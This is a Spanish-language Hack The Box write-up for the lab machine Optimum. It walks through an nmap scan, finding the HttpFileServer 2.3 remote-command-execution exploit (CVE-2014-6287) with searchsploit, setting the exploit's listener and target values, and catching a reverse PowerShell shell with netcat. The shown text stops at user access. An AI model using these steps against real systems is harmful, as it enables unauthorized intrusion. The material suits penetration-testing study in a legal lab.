---
title:  "Optimum - Hack The Box"
classes: wide
---

![styled-image](https://haoxgit.github.io/haox/assets/images/optimum/Optimum.png){: .align-center style="width: 50%;"}

Optimum es una máquina sencilla basada en vulnerar una versión obsoleta de Windows. Para obtener la shell inicial hemos vulnerado la versión 2.3 de HTTP File Server. Desde aqui hemos ejecutado herramientas automatizadas adaptandonos al enotno del sistema operativo y buscando soluciones para poder escalar privilegios en esta versión concreta.

**Portscan**
```
sudo nmap -sC -sV -p- 10.10.10.8   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-16 11:57 CEST
Nmap scan report for 10.10.10.8
Host is up (0.054s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.59 seconds
```

**Web**

Accediendo al sitio web confirmamos la presencia del servicio HTTPFileServer que habíamos visto en el escaneo nmap.

![image-left](https://haoxgit.github.io/haox/assets/images/optimum/web.png){: .align-center}

Hemos utilizado searchsploit para detectar vulnerabilidades relacionadas con la versión actual.
```
┌──(kali㉿kali)-[~/htb/optimum]
└─$ searchsploit httpfileserver
----------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
----------------------------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)       | windows/webapps/49125.py
----------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```


**Shell de Usuario**

Adicionalmente podemos realizar una busqueda en google tal como "HttpFileServer exploit" y nos apareceran otros tantos como por ejemplo <a href="https://www.exploit-db.com/exploits/49584">CVE-2014-6287</a>

Para poder ejecutar el script debemos de modificar el valor lhost y lport por nuestra IP local y el puerto a la escucha que vamos a usar para recibir la shell. Los valores rhost y rport corresponderan a la máquina víctima, en este caso:
```
lhost = "10.10.14.10"
lport = 4444
rhost = "10.10.10.8"
rport = 80
```

Para ejecutar el exploit simplemente realizaremos:
```
python3 hfs.py
```

En nuestro netcat a la escucha deberíamos obtener una shell.
```
┌──(kali㉿kali)-[~/htb/optimum]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.8] 49163

PS C:\Users\kostas\Desktop> whoami
optimum\kostas
```